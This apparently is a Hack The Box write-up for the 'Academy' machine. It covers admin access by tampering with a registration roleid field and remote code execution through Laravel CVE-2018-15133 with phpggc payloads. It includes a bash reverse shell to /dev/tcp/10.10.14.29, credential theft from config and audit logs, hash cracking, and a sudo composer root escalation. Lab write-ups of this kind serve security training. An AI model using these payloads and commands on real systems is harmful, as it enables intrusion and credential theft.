---
title: "Academy : HTB writeup"
last_modified_at: 2021-02-27
categories:
  - HTB
author_profile: false
tags:
  - Linux Privilege Escalation
  - Vulnerable Web Application
  - Audit Log
  - composer 
  - HTB
  - Writeup
---

Hack The Box's easy box with web enumeration, vulnerable website, audit logs

![/assets/images/HTB/academy_htb/Untitled.png](/assets/images/HTB/academy_htb/Untitled.png)

# Nmap Scan

```php
# Nmap 7.60 scan initiated Mon Feb 15 00:34:24 2021 as: nmap --min-rate=5000 -sC -sV -p- -o nmap_all 10.10.10.215
Warning: 10.10.10.215 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.215
Host is up (0.090s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
**22/tcp**    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
**80/tcp**    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
**33060/tcp open  mysqlx?**
| fingerprint-strings: 
|   DNSStatusRequest, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

```php
Added the following in /etc/hosts
10.10.10.215 academy.htb
```

## Port 80

![/assets/images/HTB/academy_htb/Untitled%201.png](/assets/images/HTB/academy_htb/Untitled%201.png)

## Gobuster

```php
/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
/index.php            (Status: 200) [Size: 2117]
/login.php            (Status: 200) [Size: 2627]
/register.php         (Status: 200) [Size: 3003]
/home.php             (Status: 302) [Size: 55034] [--> login.php]
/admin.php            (Status: 200) [Size: 2633]
/config.php           (Status: 200) [Size: 0]
/server-status        (Status: 403) [Size: 276]
```

## Registering User

There was not much in the user panel. 

Let's view the request as well

```php
POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 50
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: PHPSESSID=uhdiktnp7gmpge7vfstfjlshf8
dnt: 1
sec-gpc: 1
Connection: close

uid=roshan&password=roshan&confirm=roshan&roleid=0
```

The `roleid` parameter has value 0 by default. On the website, if the value is 0 it is considered as user. Let's change that value to 1

```php
POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 50
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: PHPSESSID=uhdiktnp7gmpge7vfstfjlshf8
dnt: 1
sec-gpc: 1
Connection: close

uid=rog&password=roshan&confirm=roshan&roleid=1
```

Now we can login as admin

## Admin page after logging in

![/assets/images/HTB/academy_htb/Untitled%202.png](/assets/images/HTB/academy_htb/Untitled%202.png)

This looks interesting let's change the hosts file as well

```php
10.10.10.215 academy.htb dev-staging-01.academy.htb
```

## Finding the vulnerable application

![/assets/images/HTB/academy_htb/Untitled%203.png](/assets/images/HTB/academy_htb/Untitled%203.png)

We get the following exception which emits the environment variables. On further enumerating we can find that it is vulnerable . `CVE-2018-15133`

Exploiting the vulnerability

Used [this](https://github.com/kozmic/laravel-poc-CVE-2018-15133) github repo for the exploit

We get a few problems with the phpgcc since the repo shows the old version's syntax

```php
# this is for new version
$./phpggc Laravel/RCE1 system 'id' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjI6ImlkIjt9

```

The exploit asks for two things

```php
❯ ./cve-2018-15133.php --help
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

Usage: ./cve-2018-15133.php <base64encoded_APP_KEY> <base64encoded-payload>
```

The base64encoded_APP_KEY is in the dumped variables, and the payload is above.

![/assets/images/HTB/academy_htb/Untitled%204.png](/assets/images/HTB/academy_htb/Untitled%204.png)

Combining these two

```php
❯ ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjI6ImlkIjt9
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

HTTP header for POST request: 
X-XSRF-TOKEN: eyJpdiI6IlM1XC85eEhzV2NKUE1WSTJkdGprY0ZnPT0iLCJ2YWx1ZSI6InZuK2pKYnErNjJIak5kQjRWK0piNU05WFZwZ2ptT0lzZVZqdHBMNklsTnplS2JyT1ZVM3BXeXZqRjA0SlBSODFmdEk5eXYzYjNHYzhnXC94R290c2ZqNTYyWG96SUdmQXBDNU1kM0ZiZDR1YzBcL0FqdDlOSmRqQW9HSlFuQVFuQ2RxSXJYTmU1SE1UamdRaDlWbzVQSGpQUEdrVFdPalJGZGdQWjM0eVVrU1BiaEV1clwvXC8wUmJoNjhodXh2T0dxaDQ0SUtWeThMdVRcLzZyanoxVUxLb2Q4Wlg2dTNieVB4UXBNT29DQ0g3WkZrQT0iLCJtYWMiOiIwODMxODQyM2Q1YWU5MmQ3MjRlODc0MjgyZjJmYmE1OTEzNDI3ZmRjODFmMGMyOTcxNDdhOTkwZjBmYzU3ZTg0In0=
```

Using curl to view the executed command

```php
❯ curl http://dev-staging-01.academy.htb -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Ik9tenFubzhJVXo0N2V0ZFwvTlh0SWlRPT0iLCJ2YWx1ZSI6ImNzdVZISDQrSDd0RzJvbDlPUzFjZUYzb0c5NGtZN3pPRXBMb3kyc0cxQkMwS0hyazUxZ2ozNTU3R3l4UGlJTnRWc3hBY0w1b1wvbXZYY3YyUklRclNKV0dEblJqTkNabkpLMTlUM1krS3pOeXpzVTlVMlwvUllNZ2FaVGJwYjZTMGQySm5MNGtUZXV1TTd6SGZucDA3WHc4VlwvTm9BSzBRSkdCa3Uxdk9obHZPMFpRelVjRExYU2NWcmY1ZG5hQ0xIbzJIVlRcL2FYK3RxYUVVM3Nqa0szak4yOUpLbFk0YXFCa2h4bExmc3BLazhrPSIsIm1hYyI6ImU4MGNiOWY0ZTBmMjA5MTdiMGY0YjU0YTg4NzY1MDE5NGI2MWZhNDE5Mjg0MDMzNjcyNTUyYjcwN2Y4YjYwY2QifQ==' | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0**uid=33(www-data) gid=33(www-data) groups=33(www-data)**
```

## Setting payload as reverse shell

```php
❯ ./phpggc Laravel/RCE1 system "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.29/1234 0>&1'" -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjYxOiIvYmluL2Jhc2ggLWMgJy9iaW4vYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOS8xMjM0IDA+JjEnIjt9
```

Using the payload with the exploit code

```php
❯ ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjYxOiIvYmluL2Jhc2ggLWMgJy9iaW4vYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOS8xMjM0IDA+JjEnIjt9
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

HTTP header for POST request: 
X-XSRF-TOKEN: eyJpdiI6ImhOK1hpZWdmdHFcL2xEZXVGZzRKQXNnPT0iLCJ2YWx1ZSI6Ik1uaGJxR1o4V08yVFBVQkl2SmRRdUhpQVhSclprR2cwQWRMb29tQkRVaWRibHRNWkxFdU0wTkRjRVAwS2trNlpMN2RzNWs2Qm9jbnN3WG9OYWVsZzh6RzM2c3JITjlJU2JOUHdTbWY3NGdMdWl1SXh2UDg2Z0ZsZjR4RWUycVBhcGNKVkY2d1pEWllFSE56bjJRc09rOEZvQ0NrVm5tQXRWcUxhXC9xcmp6ZGo2TzAyVWNpdldKeFVNUENaZVlXRWc4TmIzQ3lSdzlicjZ1K2xwOHh5MDdEbHNJZnE0SituZkpYdXJpN2tzOHNcL2todXhGd1k1RlhaTWcrN200OW40ZitRY0FkT1NOTHlwcXJnK1VMU1pYNEFQclhSZFZKZk96eWJON3N6RXM4c3RWa1lSYTczaGtPT0ZvUzI3OWJMekUiLCJtYWMiOiIxZGQ1MzAxNjk3ZWQyZmJiNWEyMDA2MmFhMDI2ZmViOTVmZmYyZjMzMzJhM2MxZThkNGVhOGQwYmUzZDc1MmM3In0=
```

Using curl to get reverse shelll

![/assets/images/HTB/academy_htb/Untitled%205.png](/assets/images/HTB/academy_htb/Untitled%205.png)

We get shell as www-data

## Inside the box

Getting a proper pty

```php
www-data@academy:/var/www/html/htb-academy-dev-01/public$ python3 -c "import pty;pty.spawn('/bin/bash')"
Ctrl+Z
$ stty raw -echo;fg
{press enter twice}
```

We get mysql credentials inside the box

```php
www-data@academy:/var/www/html/academy/public$ ls
Modules_files   admin.php   home.php  index.php  register.php
admin-page.php  config.php  images    login.php  success-page.php
www-data@academy:/var/www/html/academy/public$ cat config.php 
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
?>
```

Using this to view the database

```php
www-data@academy:/var/www/html/academy/public$ mysql -u root -p
Enter password:
```

```php
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| academy            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use academy
mysql> show tables;
+-------------------+
| Tables_in_academy |
+-------------------+
| users             |
+-------------------+
1 row in set (0.01 sec)
mysql> select * from users;
+----+----------+----------------------------------+--------+---------------------+
| id | username | password                         | roleid | created_at          |
+----+----------+----------------------------------+--------+---------------------+
|  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 |
| 11 | test8    | 5e40d09fa0529781afd1254a42913847 |      0 | 2020-08-11 00:44:12 |
| 12 | test     | 098f6bcd4621d373cade4e832627b4f6 |      0 | 2020-08-12 21:30:20 |
| 13 | test2    | ad0234829205b9033196ba818f7a872b |      1 | 2020-08-12 21:47:20 |
| 14 | tester   | 098f6bcd4621d373cade4e832627b4f6 |      1 | 2020-08-13 11:51:19 |
| 15 | roshan   | 3605c251087b88216c9bca890e07ad9c |      0 | 2021-02-26 17:33:35 |
| 16 | ro       | 3605c251087b88216c9bca890e07ad9c |      0 | 2021-02-26 17:41:54 |
| 17 | rog      | d6dfb33a2052663df81c35e5496b3b1b |      1 | 2021-02-26 17:47:22 |
+----+----------+----------------------------------+--------+---------------------+
```

Looking at the created_at column we can get the date in which the users were created. 

### Cracking the hashes we get

```php
tester : test
test2 : test2
test : test
test8 : hongkong
dev : mySup3rP4s5w0rd!!
```

### Users in the box

```php
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh
```

Trying these passwords for the users. One of the above password works for user

`cry0l1t3`

```php
www-data@academy:/var/www/html/academy/public$ su cry0l1t3
Password: 
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

# User Flag

```php
$ ls -la
total 44
drwxr-xr-x 6 cry0l1t3 cry0l1t3 4096 Feb 26 17:22 .
drwxr-xr-x 8 root     root     4096 Aug 10  2020 ..
lrwxrwxrwx 1 root     root        9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 cry0l1t3 cry0l1t3  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 cry0l1t3 cry0l1t3 3771 Feb 25  2020 .bashrc
drwx------ 2 cry0l1t3 cry0l1t3 4096 Aug 12  2020 .cache
drwx------ 4 cry0l1t3 cry0l1t3 4096 Feb 26 17:00 .gnupg
-rw------- 1 cry0l1t3 cry0l1t3   94 Feb 26 17:15 .lesshst
drwxrwxr-x 3 cry0l1t3 cry0l1t3 4096 Aug 12  2020 .local
-rw------- 1 cry0l1t3 cry0l1t3    0 Feb 26 17:22 nohup.out
-rw-r--r-- 1 cry0l1t3 cry0l1t3  807 Feb 25  2020 .profile
drwxr-xr-x 3 cry0l1t3 cry0l1t3 4096 Feb 26 17:00 snap
-r--r----- 1 cry0l1t3 cry0l1t3   33 Feb 26 15:45 user.txt
```

Since the user is in `adm` group so the escalation could be in log files

On running linpeas we get the following

```php
[+] Checking for TTY (sudo/su) passwords in audit logs
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mr******3my!",<nl>
/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

This is the password for user `mrb3n`. I will discuss more about this later.

## Horizontal Escalation

```php
cry0l1t3@academy:~$ su mrb3n
Password: 
$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
$
```

There is a sudoers entry for user `mrb3n`

```php
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

Using GTFO bins to get root

```php
mrb3n@academy:~$ TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
# id
uid=0(root) gid=0(root) groups=0(root)
```

# Root flag

```php
# cd /root
# ls
academy.txt  root.txt  snap
```

# Audit log has password

`The pam_tty_audit PAM module is used to enable or disable TTY auditing. By default, the kernel does not audit input on any TTY.`

TTY of specific users could be logged using Linux PAM ( Pluggable Authentication Module). More information on this [here](https://www.tecmint.com/configure-pam-to-audit-logging-shell-tty-user-activity/). I searched for the entry in the `pam.d` configuration files but I was not able to find it. 

# Final Thoughts

Overall the machine was good, I was confused on which vulnerability to use to gain access to the machine. The tty audit logs were totally new to me, `linpeas` helped me to find the them. All the steps were quite straight forward.